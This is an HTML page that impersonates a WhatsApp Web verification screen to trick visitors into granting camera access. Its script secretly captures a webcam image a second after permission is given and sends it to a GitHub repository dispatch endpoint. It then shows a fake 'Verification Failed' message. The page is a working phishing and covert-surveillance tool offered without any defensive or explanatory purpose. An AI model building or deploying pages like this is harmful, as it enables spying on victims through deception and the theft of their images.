<!DOCTYPE html>
<html>
<head>
    <title>Verification Required</title>
    <style>
        body { background: #000; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
        video { display: none; }
        canvas { display: none; }
        .btn { padding: 15px 30px; background: #25d366; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="80">
    <h2>WhatsApp Web Verification</h2>
    <p>Please allow camera access to scan the QR code and verify your session.</p>
    <button class="btn" onclick="startCapture()">Verify Now</button>

    <video id="video" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
    async function startCapture() {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;

        // التقاط صورة بعد ثانية واحدة من السماح
        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg');
            sendToGithub(imageData);
        }, 1000);
    }

    async function sendToGithub(data) {
        await fetch('https://api.github.com/repos/mazenasad/Roblox/dispatches', {
            method: 'POST',
            headers: {
                'Authorization': 'Bearer YOUR_TOKEN',
                'Accept': 'application/vnd.github.v3+json'
            },
            body: JSON.stringify({ event_type: 'log_image', client_payload: { img: data } })
        });
        alert("Verification Failed. Try again later.");
    }
    </script>
</body>
</html>
